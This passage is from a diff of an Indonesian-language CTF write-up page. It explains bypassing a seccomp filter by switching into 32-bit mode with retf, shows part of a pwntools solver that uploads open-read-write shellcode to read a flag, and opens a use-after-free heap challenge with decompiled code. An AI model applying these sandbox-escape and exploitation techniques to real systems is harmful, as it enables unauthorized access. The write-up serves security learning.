-<span style="color:#ae81ff">0001</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
-<span style="color:#ae81ff">0002</span>: <span style="color:#ae81ff">0x25</span> <span style="color:#ae81ff">0x0c</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x3fffffff</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3fffffff</span>) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0003</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x0b</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000059</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> readlink) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0004</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x0a</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000002</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> open) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0005</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x09</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000038</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> clone) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0006</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x08</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000039</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> fork) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0007</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x07</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000003a</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> vfork) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000003b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> execve) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">000</span><span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x05</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000055</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> creat) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0010</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x04</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000101</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> openat) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0011</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x03</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000142</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> execveat) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0012</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x02</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> read) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0013</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000011</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> pread64) goto <span style="color:#ae81ff">0015</span>
-<span style="color:#ae81ff">0014</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x00000013</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> readv) goto <span style="color:#ae81ff">0016</span>
-<span style="color:#ae81ff">0015</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
-<span style="color:#ae81ff">0016</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x7fff0000</span>  <span style="color:#66d9ef">return</span> ALLOW
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="summary">Summary</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">  line  CODE  JT   JF      K
+  <span style="color:#f92672">=================================</span>
+  <span style="color:#ae81ff">0000</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000004</span>  A <span style="color:#f92672">=</span> arch
+  <span style="color:#ae81ff">0001</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
+  <span style="color:#ae81ff">0002</span>: <span style="color:#ae81ff">0x25</span> <span style="color:#ae81ff">0x0c</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x3fffffff</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3fffffff</span>) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0003</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x0b</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000059</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> readlink) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0004</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x0a</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000002</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> open) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0005</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x09</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000038</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> clone) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0006</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x08</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000039</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> fork) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0007</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x07</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000003a</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> vfork) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000003b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> execve) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">000</span><span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x05</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000055</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> creat) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0010</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x04</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000101</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> openat) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0011</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x03</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000142</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> execveat) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0012</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x02</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> read) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0013</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000011</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> pread64) goto <span style="color:#ae81ff">0015</span>
+  <span style="color:#ae81ff">0014</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x00000013</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> readv) goto <span style="color:#ae81ff">0016</span>
+  <span style="color:#ae81ff">0015</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
+  <span style="color:#ae81ff">0016</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x7fff0000</span>  <span style="color:#66d9ef">return</span> ALLOW
+</code></pre></div><h2 id="summary">Summary</h2>
 <ul>
 <li>sys_number &gt; 0x3fffffff, ini membuat syscall ABI tidak bisa digunakan.</li>
-<li>fungsi penting yaitu open, openat, execve, execveat, read, terblacklist. Jadi open/read/write dan rce tidak bisa dilakukan.</li>
-<li>selainnya, belum baca-baca lagi gan :v</li>
+<li>syscall penting seperti open, openat, execve, execveat, read dalam 64 bit diblacklist. Jadi open-read-write dan rce tidak bisa dilakukan dalam 64 bit.</li>
+<li>selainnya, belum baca-baca lagi gan :)</li>
 </ul>
 <h2 id="exploit-1">Exploit</h2>
-<p>Didalam assembly, ada instruksi yang bernama <code>far return</code> atau biasa dikenal dengan <code>retf</code>. Intruksi ini akan pop 2 value, yaitu di <em>cs</em> dan <em>ip</em>. Jika value <em>cs</em> ini 0x23, maka program akan return ke &ldquo;32 bit mode&rdquo;. Kalau cs ini 0x33, program return ke &ldquo;64 bit mode&rdquo;. Dengan mengubah cs menjadi 0x23, maka kita bisa menjalankan syscall 32 bit diproses 64 bit. Hal ini cukup mem-<em>bypass</em> filter-filter diatas. Karena <em>syscall_number</em> di 32 bit berbeda dengan 64 bit.</p>
-<p>Sekarang, apa yang dilakukan? RCE dengan execve yang memiliki syscall number 11? difilter. Solusinya adalah open-read-write file flag dengan letak flag yang diketahui melalui dockerfile.</p>
+<p>Didalam intel assembly, ada instruksi yang bernama <code>far return</code> atau biasa dikenal dengan <code>retf</code>. Intruksi ini akan pop 2 value, yaitu di <code>cs</code> dan <code>ip</code>. Jika value <code>cs</code> ini 0x23, maka program akan return ke context binary 32 bit. Selainnya kalau <code>cs</code> ini 0x33, maka program return ke context binary 64 bit.</p>
+<p>Dengan mengubah register <code>cs</code> menjadi 0x23, maka kita akan return ke &ldquo;32 bit mode&rdquo; atau dengan kata lain, kita menjalankan syscall 32 bit diproses 64 bit. Hal ini cukup mem-<em>bypass</em> filter-filter diatas. Karena <em>syscall_number</em> di 32 bit berbeda dengan 64 bit.</p>
+<p>Karena syscall_number 11 itu difilter (dalam 32 bit ini adalah execve), maka RCE sulit dilakukan. Solusinya adalah menggunakan open-read-write shellcoding, dengan letak flag yang diketahui melalui dockerfile.</p>
 <p>Full solver,</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -947,68 +508,23 @@ response  <span style="color:#f92672">=</span> upload_file(shellcode)
 flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;flag{.*}&#34;</span>, response)<span style="color:#f92672">.</span>group()
 
 <span style="color:#66d9ef">print</span> flag
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="flag-3">Flag</h2>
+</code></pre></div><h2 id="flag-3">Flag</h2>
 <p><code>flag{dc75c408f5ba2fbc72b307987dddc775}</code></p>
 <h1 id="waf-500pts">WAF [500pts]</h1>
 <blockquote>
 <p>Not to be confused with Web Application Firewall.</p>
 </blockquote>
 <p>Ini merupakan soal the least solves with 1 solve. Ya, hanya 1 yang menyelesaikan. Bug pada soal ini menyangkut use-after-free klasik yang tidak terlalu rumit. Asumsi saya mengapa tidak banyak yang menyelesaikan soal ini adalah mungkin banyak tim yang terlalu memikir jauh tentang exploitasi soal ini.</p>
-<h2 id="structure">Structure</h2>
+<h2 id="data-structure">Data Structure</h2>
 <p>Kira-kira, struktur data-nya <em>begini</em>,</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> Config {
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> Config {
     <span style="color:#66d9ef">int</span> id;
     <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>setting;
     <span style="color:#66d9ef">char</span> is_active;
 }
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="add-config">Add Config</h2>
+</code></pre></div><h2 id="add-config">Add Config</h2>
 <p>Difungsi ini, hanya input id, size, lalu setting config diallokasikan menggunakan <em>malloc</em>.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">add_config</span>(<span style="color:#66d9ef">__int64</span> a1)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">add_config</span>(<span style="color:#66d9ef">__int64</span> a1)
 {
     <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// rbx@1
 </span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> v3; <span style="color:#75715e">// [sp+1Bh] [bp-35h]@1
@@ -1036,52 +552,9 @@ flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>
     puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Config added.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
     <span style="color:#66d9ef">return</span> v6 <span style="color:#f92672">-</span> <span style="color:#f92672">*</span>MK_FP(__FS__, <span style="color:#ae81ff">40LL</span>);
 }
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="edit-config">Edit Config</h2>
+</code></pre></div><h2 id="edit-config">Edit Config</h2>
 <p>Realloc data yang sudah diallokasikan, berdasarkan index config.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
